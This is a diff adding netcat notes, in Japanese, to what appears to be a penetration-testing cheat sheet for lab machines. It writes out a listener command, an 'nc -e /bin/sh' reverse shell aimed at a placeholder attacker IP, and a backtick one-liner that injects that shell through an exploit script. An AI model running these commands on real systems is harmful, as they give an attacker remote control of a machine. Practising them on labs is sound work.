@@ -223,6 +223,23 @@ sudo wfuzz -c -f sub-fighter -Z -w <path_to_wordlist> --sc 200  --hw 0 -s 0.25 -
 sudo gobuster dir -u https://example.htb/ -w /wordommon.txt -t 50 -x php,html -k -b 302 | tee resutl_gobuster.txt
 ```
 
+# NetCat
+リバースシェル待ち受け
+```
+nc -lvnp 4444
+```
+
+ターゲットから自サーバにリバースシェル投げる、-eで接続できたときに引数のプログラムを実行する、/bin/shは-eの引数で、接続確立後にターゲットの/bin/shを実行してシェルをattackerから動かせるようにする。
+```
+nc -e /bin/sh <attackerIP> <attakerPort>
+```
+
+
+# OneLinner
+Pythonのワンライナーでは、バッククオートを使う点に注意
+```
+python exploit.py --command `nc -e /bin/sh <attackerIP> <attackerPort>`
+```
 
 
 
